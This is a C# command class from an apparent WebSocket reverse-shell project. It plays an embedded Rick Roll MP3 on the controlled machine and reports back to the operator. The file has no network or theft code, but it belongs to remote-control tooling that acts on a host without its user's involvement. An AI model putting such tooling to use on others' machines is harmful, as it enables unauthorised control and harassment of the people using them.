using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using NAudio.Wave;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class RickRoll : Command
    {
        public string ExecuteCommand(string command)
        {
            string resourceName = "WebSocketReverseShellDotNet.resources.rick-roll-bass-boosted.mp3";

            OSUtil.RunInSeparateThread(() => PlayMp3FromResource(resourceName));

            return "Playing Rick Roll";
        }

        public async Task PlayMp3FromResource(string resourceName)
        {

            // Load the embedded resource stream
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))


                using (var reader = new Mp3FileReader(stream))
                using (var waveOut = new WaveOutEvent())
                {
                    waveOut.Init(reader);
                    waveOut.Play();

                    // Wait for the playback to finish
                    while (waveOut.PlaybackState == PlaybackState.Playing)
                    {
                        System.Threading.Thread.Sleep(10);
                    }
                }
            }
        }
    }

